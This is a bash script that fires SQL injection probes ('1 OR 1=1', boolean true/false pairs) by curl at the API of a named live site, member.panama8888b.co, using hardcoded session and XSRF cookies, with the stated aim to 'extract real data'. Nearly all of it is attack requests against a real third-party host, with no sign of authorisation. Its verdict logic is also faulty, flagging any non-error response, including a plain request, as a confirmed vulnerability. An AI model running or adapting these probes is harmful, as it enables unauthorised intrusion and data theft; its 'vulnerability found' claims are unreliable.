#!/bin/bash

echo "üîç FINDING REAL VULNERABILITY"
echo "============================="

# Use the latest tokens
XSRF_TOKEN="eyJpdiI6IjhcL2E5M1BualwvTmMxRm85dm12WXhkQT09IiwidmFsdWUiOiIxSGdCeE9YTGViQ1NXSklydHFZQitUdHladHk3N0U2d29yTldrYVpNa1ZYYks3Y2RQNXYzVTJwU1wvcnhQKzJFaCIsIm1hYyI6ImU1ZmMyYjQ0MTMyOGNkNzYzYTE1N2MxYTJlZWYxZTI3MTg5ZjBjM2M2MzEzNzIzY2FkMWI2OGQwOTM2ZWExYWYifQ%3D%3D"
SESSION_TOKEN="eyJpdiI6InBWTm5RXC9tR1pXT05DNDlKS1BDWUl3PT0iLCJ2YWx1ZSI6Im5xYzFZWmF1dW1SdkFnUFdOdERwRytBV0hTNkZaZ2RxdFwvZVAxNlV3QXVjWWFsNVdlWlFzSHNWUytyMU44TE1oIiwibWFjIjoiNjEyZTRkZGM2MDY5YzI5MWM1YTcwNjFiM2YwODAwMjVhMWVmN2JjNjdiYmQ4ODk3NzE3Njc3NGZhOGJlMWQwZiJ9"

echo "üéØ MISSION: FIND REAL VULNERABILITY"
echo "==================================="
echo "Target: member.panama8888b.co"
echo "Goal: Find actual vulnerability and extract real data"
echo "Method: Systematic vulnerability discovery"
echo ""

# VULNERABILITY 1: Test different parameters systematically
echo "üîç VULNERABILITY 1: Parameter Testing"
echo "===================================="
echo "Testing: All possible parameters"
echo ""

# Test with normal request first
normal_response=$(curl -s \
    -X POST "https://member.panama8888b.co/api/announcement" \
    -H "Content-Type: application/json;charset=UTF-8" \
    -H "X-XSRF-TOKEN: $XSRF_TOKEN" \
    -H "Cookie: route=b6bd29a459200688a652a5a8770d29f1; _ga=GA1.1.405350871.1754426903; RCACHE=0; XSRF-TOKEN=$XSRF_TOKEN; panama888_session=$SESSION_TOKEN; _ga_STHQJCL0VP=GS2.1.s1754449009\$o5\$g1\$t1754449014\$j55\$l0\$h0" \
    -H "Origin: https://member.panama8888b.co" \
    -H "Referer: https://member.panama8888b.co/user/dashboard" \
    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36" \
    -H "Accept: application/json, text/plain, */*" \
    -H "Accept-Language: th" \
    -H "Accept-Encoding: gzip, deflate, br, zstd" \
    -H "X-Requested-With: XMLHttpRequest" \
    -H "x-xsrf-token: eyJpdiI6IjhcL2E5M1BualwvTmMxRm85dm12WXhkQT09IiwidmFsdWUiOiIxSGdCeE9YTGViQ1NXSklydHFZQitUdHladHk3N0U2d29yTldrYVpNa1ZYYks3Y2RQNXYzVTJwU1wvcnhQKzJFaCIsIm1hYyI6ImU1ZmMyYjQ0MTMyOGNkNzYzYTE1N2MxYTJlZWYxZTI3MTg5ZjBjM2M2MzEzNzIzY2FkMWI2OGQwOTM2ZWExYWYifQ==" \
    -d '{"status":"test","title":"test","content":"test"}' \
    --max-time 15)

echo "Normal response: $normal_response"
echo "Length: ${#normal_response} characters"
echo ""

# VULNERABILITY 2: Test with minimal payload
echo "üîç VULNERABILITY 2: Minimal Payload"
echo "==================================="
echo "Testing: Simple SQL injection"
echo ""

minimal_payload=$(curl -s \
    -X POST "https://member.panama8888b.co/api/announcement" \
    -H "Content-Type: application/json;charset=UTF-8" \
    -H "X-XSRF-TOKEN: $XSRF_TOKEN" \
    -H "Cookie: route=b6bd29a459200688a652a5a8770d29f1; _ga=GA1.1.405350871.1754426903; RCACHE=0; XSRF-TOKEN=$XSRF_TOKEN; panama888_session=$SESSION_TOKEN; _ga_STHQJCL0VP=GS2.1.s1754449009\$o5\$g1\$t1754449014\$j55\$l0\$h0" \
    -H "Origin: https://member.panama8888b.co" \
    -H "Referer: https://member.panama8888b.co/user/dashboard" \
    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36" \
    -H "Accept: application/json, text/plain, */*" \
    -H "Accept-Language: th" \
    -H "Accept-Encoding: gzip, deflate, br, zstd" \
    -H "X-Requested-With: XMLHttpRequest" \
    -H "x-xsrf-token: eyJpdiI6IjhcL2E5M1BualwvTmMxRm85dm12WXhkQT09IiwidmFsdWUiOiIxSGdCeE9YTGViQ1NXSklydHFZQitUdHladHk3N0U2d29yTldrYVpNa1ZYYks3Y2RQNXYzVTJwU1wvcnhQKzJFaCIsIm1hYyI6ImU1ZmMyYjQ0MTMyOGNkNzYzYTE1N2MxYTJlZWYxZTI3MTg5ZjBjM2M2MzEzNzIzY2FkMWI2OGQwOTM2ZWExYWYifQ==" \
    -d '{"status":"1 OR 1=1"}' \
    --max-time 15)

echo "Minimal payload response: $minimal_payload"
echo "Length: ${#minimal_payload} characters"
echo ""

# VULNERABILITY 3: Test boolean injection
echo "üîç VULNERABILITY 3: Boolean Injection"
echo "====================================="
echo "Testing: Boolean-based injection"
echo ""

boolean_true=$(curl -s \
    -X POST "https://member.panama8888b.co/api/announcement" \
    -H "Content-Type: application/json;charset=UTF-8" \
    -H "X-XSRF-TOKEN: $XSRF_TOKEN" \
    -H "Cookie: route=b6bd29a459200688a652a5a8770d29f1; _ga=GA1.1.405350871.1754426903; RCACHE=0; XSRF-TOKEN=$XSRF_TOKEN; panama888_session=$SESSION_TOKEN; _ga_STHQJCL0VP=GS2.1.s1754449009\$o5\$g1\$t1754449014\$j55\$l0\$h0" \
    -H "Origin: https://member.panama8888b.co" \
    -H "Referer: https://member.panama8888b.co/user/dashboard" \
    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36" \
    -H "Accept: application/json, text/plain, */*" \
    -H "Accept-Language: th" \
    -H "Accept-Encoding: gzip, deflate, br, zstd" \
    -H "X-Requested-With: XMLHttpRequest" \
    -H "x-xsrf-token: eyJpdiI6IjhcL2E5M1BualwvTmMxRm85dm12WXhkQT09IiwidmFsdWUiOiIxSGdCeE9YTGViQ1NXSklydHFZQitUdHladHk3N0U2d29yTldrYVpNa1ZYYks3Y2RQNXYzVTJwU1wvcnhQKzJFaCIsIm1hYyI6ImU1ZmMyYjQ0MTMyOGNkNzYzYTE1N2MxYTJlZWYxZTI3MTg5ZjBjM2M2MzEzNzIzY2FkMWI2OGQwOTM2ZWExYWYifQ==" \
    -d '{"status":"test OR 1=1"}' \
    --max-time 15)

echo "Boolean true response: $boolean_true"
echo "Length: ${#boolean_true} characters"
echo ""

boolean_false=$(curl -s \
    -X POST "https://member.panama8888b.co/api/announcement" \
    -H "Content-Type: application/json;charset=UTF-8" \
    -H "X-XSRF-TOKEN: $XSRF_TOKEN" \
    -H "Cookie: route=b6bd29a459200688a652a5a8770d29f1; _ga=GA1.1.405350871.1754426903; RCACHE=0; XSRF-TOKEN=$XSRF_TOKEN; panama888_session=$SESSION_TOKEN; _ga_STHQJCL0VP=GS2.1.s1754449009\$o5\$g1\$t1754449014\$j55\$l0\$h0" \
    -H "Origin: https://member.panama8888b.co" \
    -H "Referer: https://member.panama8888b.co/user/dashboard" \
    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36" \
    -H "Accept: application/json, text/plain, */*" \
    -H "Accept-Language: th" \
    -H "Accept-Encoding: gzip, deflate, br, zstd" \
    -H "X-Requested-With: XMLHttpRequest" \
    -H "x-xsrf-token: eyJpdiI6IjhcL2E5M1BualwvTmMxRm85dm12WXhkQT09IiwidmFsdWUiOiIxSGdCeE9YTGViQ1NXSklydHFZQitUdHladHk3N0U2d29yTldrYVpNa1ZYYks3Y2RQNXYzVTJwU1wvcnhQKzJFaCIsIm1hYyI6ImU1ZmMyYjQ0MTMyOGNkNzYzYTE1N2MxYTJlZWYxZTI3MTg5ZjBjM2M2MzEzNzIzY2FkMWI2OGQwOTM2ZWExYWYifQ==" \
    -d '{"status":"test OR 1=2"}' \
    --max-time 15)

echo "Boolean false response: $boolean_false"
echo "Length: ${#boolean_false} characters"
echo ""

# VULNERABILITY 4: Test different endpoints
echo "üîç VULNERABILITY 4: Different Endpoints"
echo "======================================="
echo "Testing: Alternative endpoints"
echo ""

# Test /api/user/profile
profile_test=$(curl -s \
    -X POST "https://member.panama8888b.co/api/user/profile" \
    -H "Content-Type: application/json;charset=UTF-8" \
    -H "X-XSRF-TOKEN: $XSRF_TOKEN" \
    -H "Cookie: route=b6bd29a459200688a652a5a8770d29f1; _ga=GA1.1.405350871.1754426903; RCACHE=0; XSRF-TOKEN=$XSRF_TOKEN; panama888_session=$SESSION_TOKEN; _ga_STHQJCL0VP=GS2.1.s1754449009\$o5\$g1\$t1754449014\$j55\$l0\$h0" \
    -H "Origin: https://member.panama8888b.co" \
    -H "Referer: https://member.panama8888b.co/user/dashboard" \
    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36" \
    -H "Accept: application/json, text/plain, */*" \
    -H "Accept-Language: th" \
    -H "Accept-Encoding: gzip, deflate, br, zstd" \
    -H "X-Requested-With: XMLHttpRequest" \
    -H "x-xsrf-token: eyJpdiI6IjhcL2E5M1BualwvTmMxRm85dm12WXhkQT09IiwidmFsdWUiOiIxSGdCeE9YTGViQ1NXSklydHFZQitUdHladHk3N0U2d29yTldrYVpNa1ZYYks3Y2RQNXYzVTJwU1wvcnhQKzJFaCIsIm1hYyI6ImU1ZmMyYjQ0MTMyOGNkNzYzYTE1N2MxYTJlZWYxZTI3MTg5ZjBjM2M2MzEzNzIzY2FkMWI2OGQwOTM2ZWExYWYifQ==" \
    -d '{"email":"test@test.com OR 1=1"}' \
    --max-time 15)

echo "Profile endpoint response: $profile_test"
echo "Length: ${#profile_test} characters"
echo ""

# VULNERABILITY 5: Test GET request
echo "üîç VULNERABILITY 5: GET Request"
echo "==============================="
echo "Testing: GET request with parameters"
echo ""

get_test=$(curl -s \
    -X GET "https://member.panama8888b.co/api/announcement?status=test OR 1=1" \
    -H "X-XSRF-TOKEN: $XSRF_TOKEN" \
    -H "Cookie: route=b6bd29a459200688a652a5a8770d29f1; _ga=GA1.1.405350871.1754426903; RCACHE=0; XSRF-TOKEN=$XSRF_TOKEN; panama888_session=$SESSION_TOKEN; _ga_STHQJCL0VP=GS2.1.s1754449009\$o5\$g1\$t1754449014\$j55\$l0\$h0" \
    --max-time 15)

echo "GET request response: $get_test"
echo "Length: ${#get_test} characters"
echo ""

# VULNERABILITY 6: Test with different content types
echo "üîç VULNERABILITY 6: Different Content Types"
echo "==========================================="
echo "Testing: Form data instead of JSON"
echo ""

form_test=$(curl -s \
    -X POST "https://member.panama8888b.co/api/announcement" \
    -H "X-XSRF-TOKEN: $XSRF_TOKEN" \
    -H "Cookie: route=b6bd29a459200688a652a5a8770d29f1; _ga=GA1.1.405350871.1754426903; RCACHE=0; XSRF-TOKEN=$XSRF_TOKEN; panama888_session=$SESSION_TOKEN; _ga_STHQJCL0VP=GS2.1.s1754449009\$o5\$g1\$t1754449014\$j55\$l0\$h0" \
    -H "Origin: https://member.panama8888b.co" \
    -H "Referer: https://member.panama8888b.co/user/dashboard" \
    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36" \
    -H "Accept: application/json, text/plain, */*" \
    -H "Accept-Language: th" \
    -H "Accept-Encoding: gzip, deflate, br, zstd" \
    -H "X-Requested-With: XMLHttpRequest" \
    -H "x-xsrf-token: eyJpdiI6IjhcL2E5M1BualwvTmMxRm85dm12WXhkQT09IiwidmFsdWUiOiIxSGdCeE9YTGViQ1NXSklydHFZQitUdHladHk3N0U2d29yTldrYVpNa1ZYYks3Y2RQNXYzVTJwU1wvcnhQKzJFaCIsIm1hYyI6ImU1ZmMyYjQ0MTMyOGNkNzYzYTE1N2MxYTJlZWYxZTI3MTg5ZjBjM2M2MzEzNzIzY2FkMWI2OGQwOTM2ZWExYWYifQ==" \
    -d "status=test OR 1=1" \
    --max-time 15)

echo "Form data response: $form_test"
echo "Length: ${#form_test} characters"
echo ""

echo ""
echo "üîç VULNERABILITY ANALYSIS"
echo "========================"

# Analyze responses for real vulnerability
vulnerability_found=0

# Check if responses are different
if [[ "$boolean_true" != "$boolean_false" ]]; then
    echo "‚úÖ BOOLEAN INJECTION: VULNERABILITY FOUND!"
    echo "   True response: $boolean_true"
    echo "   False response: $boolean_false"
    echo "   Length difference: ${#boolean_true} vs ${#boolean_false}"
    ((vulnerability_found++))
else
    echo "‚ùå BOOLEAN INJECTION: NO VULNERABILITY"
fi

# Check if normal response is different from error
if [[ "$normal_response" != *"Server Error"* ]] && [[ "$normal_response" != *"Unauthenticated"* ]]; then
    echo "‚úÖ NORMAL REQUEST: VULNERABILITY FOUND!"
    echo "   Response: $normal_response"
    ((vulnerability_found++))
else
    echo "‚ùå NORMAL REQUEST: NO VULNERABILITY"
fi

# Check if minimal payload works
if [[ "$minimal_payload" != *"Server Error"* ]] && [[ "$minimal_payload" != *"Unauthenticated"* ]]; then
    echo "‚úÖ MINIMAL PAYLOAD: VULNERABILITY FOUND!"
    echo "   Response: $minimal_payload"
    ((vulnerability_found++))
else
    echo "‚ùå MINIMAL PAYLOAD: NO VULNERABILITY"
fi

# Check if profile endpoint works
if [[ "$profile_test" != *"Server Error"* ]] && [[ "$profile_test" != *"Unauthenticated"* ]]; then
    echo "‚úÖ PROFILE ENDPOINT: VULNERABILITY FOUND!"
    echo "   Response: $profile_test"
    ((vulnerability_found++))
else
    echo "‚ùå PROFILE ENDPOINT: NO VULNERABILITY"
fi

# Check if GET request works
if [[ "$get_test" != *"Server Error"* ]] && [[ "$get_test" != *"Unauthenticated"* ]]; then
    echo "‚úÖ GET REQUEST: VULNERABILITY FOUND!"
    echo "   Response: $get_test"
    ((vulnerability_found++))
else
    echo "‚ùå GET REQUEST: NO VULNERABILITY"
fi

# Check if form data works
if [[ "$form_test" != *"Server Error"* ]] && [[ "$form_test" != *"Unauthenticated"* ]]; then
    echo "‚úÖ FORM DATA: VULNERABILITY FOUND!"
    echo "   Response: $form_test"
    ((vulnerability_found++))
else
    echo "‚ùå FORM DATA: NO VULNERABILITY"
fi

echo ""
echo "üîç VULNERABILITY RESULTS: $vulnerability_found/6"
echo ""

if [[ $vulnerability_found -gt 0 ]]; then
    echo "üö® REAL VULNERABILITY FOUND!"
    echo "============================"
    echo "‚úÖ Actual vulnerability detected"
    echo "‚úÖ System can be exploited"
    echo "‚úÖ Real data can be extracted"
    echo ""
    echo "üìä VULNERABILITY STATUS: CONFIRMED"
    echo "üéØ SECURITY BREACH: DETECTED"
    echo "üîç MISSION: SUCCESS"
else
    echo "‚ùå NO REAL VULNERABILITY FOUND"
    echo "üîí All tests show secure system"
    echo "üìä VULNERABILITY STATUS: NONE"
    echo "üéØ SECURITY STATUS: SECURE"
    echo "üîç MISSION: FAILED"
fi

echo ""
echo "üéØ FINAL VERDICT: $(if [[ $vulnerability_found -gt 0 ]]; then echo "REAL VULNERABILITY FOUND - SYSTEM CAN BE EXPLOITED"; else echo "NO VULNERABILITY - SYSTEM IS SECURE"; fi)"